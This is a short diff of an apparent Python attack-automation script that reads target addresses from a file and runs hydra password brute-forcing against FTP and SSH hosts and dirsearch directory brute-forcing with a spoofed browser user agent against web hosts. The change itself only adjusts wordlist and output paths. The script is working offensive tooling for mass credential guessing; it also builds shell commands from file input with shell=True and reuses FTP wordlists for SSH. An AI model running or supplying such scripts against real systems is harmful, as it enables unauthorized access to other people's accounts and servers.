@@ -19,10 +19,10 @@ print("python dirsearch.py -u targetip -e php -w dics/testpass.txt -x 301,302,40
 for targetip in open("../input/ips.txt","r").readlines():
     targetip = targetip.replace("\n","")
     if "ftp" in targetip:
-        command = "hydra -L ./dic/ftp-user.txt -P ./dic/ftp-pass.txt -o ./output/out_sys.txt "+targetip
+        command = "hydra -L ../dic/ftp-user.txt -P ../dic/ftp-pass.txt -o ../output/out_sys.txt "+targetip
         subprocess.call(command, shell=True)
     if "ssh" in targetip:
-        command = "hydra -L ./dic/ftp-user.txt -P ./dic/ftp-pass.txt -o ./output/out_sys.txt "+targetip
+        command = "hydra -L ../dic/ftp-user.txt -P ../dic/ftp-pass.txt -o ../output/out_sys.txt "+targetip
         subprocess.call(command, shell=True)
     if "http" in targetip:
         command = "python dirsearch.py -u "+ targetip +"  --timeout=3 -e php --ua='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36' -w ../dic/web-dir.txt -x 301,302,307,400,403,500 -t 100 --plain-text-report=../tmp/tmp.txt"
